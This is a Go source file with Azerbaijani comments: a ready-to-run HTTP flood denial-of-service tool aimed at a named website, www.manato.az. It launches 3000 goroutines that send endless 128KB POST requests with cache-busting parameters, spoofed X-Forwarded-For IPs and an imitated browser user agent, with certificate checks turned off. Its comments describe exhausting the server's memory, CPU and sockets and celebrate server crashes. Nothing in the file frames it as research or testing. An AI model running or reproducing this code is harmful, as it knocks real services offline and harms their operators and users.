package main

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net/http"
	"strings"
	"sync"
	"time"
)

func main() {
    // Hədəf endpoint - qeydiyyat və ya giriş hissəsi bazanı daha çox yorur
	target := "https://www.manato.az" 
	workers := 3000 // Railway gücünü sona qədər istifadə edirik
	
	fmt.Printf("[!!!] HAKAI-FINAL-ZERO DEVRƏDƏ: %s\n", target)

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS12,
		},
		MaxIdleConns:        50000,
		MaxIdleConnsPerHost: 25000,
		// HTTP/2 dəstəyini məcburi edirik ki, sürət daha yüksək olsun
		ForceAttemptHTTP2:   true, 
		// Bağlantıları açıq saxlayaraq serverin socketlərini "kilidləyirik"
		DisableKeepAlives:   false,
	}

	client := &http.Client{Transport: tr, Timeout: 5 * time.Second}

	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			// 128KB - Serverin RAM və CPU-sunu tam bitirmək üçün ağır payload
			payload := "data=" + strings.Repeat("Z", 131072) 
			
			for {
				// Cache bypass - Hər sorğu serverin verilənlər bazasına zərbədir
				u := fmt.Sprintf("%s?v=%d&s=%d", target, time.Now().UnixNano(), rand.Int())
				
				req, _ := http.NewRequest("POST", u, strings.NewReader(payload))
				
				// Real Chrome 122+ Header imitasiyası
				req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0 Safari/537.36")
				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
				req.Header.Set("X-Requested-With", "XMLHttpRequest")
				req.Header.Set("X-Forwarded-For", fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255)))

				resp, err := client.Do(req)
				if err == nil {
					// 502/504 xətası gəlirsə server rəsmi olaraq çökmüş sayılır
					if resp.StatusCode >= 500 {
						fmt.Printf("[KILL-%d] Status: %d (SERVER CRASHED)\n", id, resp.StatusCode)
					}
					// Body-ni dərhal qapatmırıq ki, socket bir müddət asılı qalsın
					time.Sleep(50 * time.Millisecond)
					resp.Body.Close()
				} else {
					// Bağlantı qurula bilmirsə (Timeout/Refused), bu zəfərdir
					fmt.Printf("[CRITICAL-%d] TARGET UNREACHABLE / ERROR\n", id)
				}
			}
		}(i)
	}
	wg.Wait()
}
